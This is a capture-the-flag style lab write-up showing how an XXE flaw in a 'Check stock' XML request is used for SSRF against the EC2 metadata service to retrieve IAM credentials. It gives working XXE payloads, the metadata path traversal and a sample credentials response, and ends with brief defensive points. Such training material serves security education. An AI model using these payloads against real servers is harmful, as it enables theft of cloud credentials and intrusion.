Exploiting XXE to Perform SSRF Attacks

**Category**: XXE  
**Difficulty**: Apprentice  

---

## Overview

This lab demonstrates how an XXE (XML External Entity) vulnerability can be used to perform SSRF (Server-Side Request Forgery).  
The application has a "Check stock" feature that parses XML input, allowing exploitation of the XML parser to send HTTP requests to internal services.

Target: Simulated EC2 metadata endpoint at `http://169.254.169.254/`.

Goal: Retrieve the IAM `SecretAccessKey` by exploiting XXE to access the metadata API.

---

## Steps to Reproduce

### 1. Intercept the Request

- Navigated to a product page and clicked "Check stock"
- Intercepted the POST request using Burp Suite.

### 2. Inject External Entity

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/">
]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
3. Directory Traversal of Metadata API
Repeated the request, updating the SYSTEM URL each time to traverse deeper:

/latest/

/latest/meta-data/

/latest/meta-data/iam/

/latest/meta-data/iam/security-credentials/

Eventually discovered the role name: admin

4. Final Payload
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">
]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
5. Response
Received the following JSON response containing credentials:
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYzEXAMPLEKEY",
  "Token": "..."
}

Key Points
XXE can be used to trigger SSRF to internal services like AWS EC2 metadata APIs.

EC2 metadata is accessible without authentication from inside the instance.

Parsing untrusted XML without disabling external entities is dangerous.

Always sanitize or validate input before parsing it as XML.
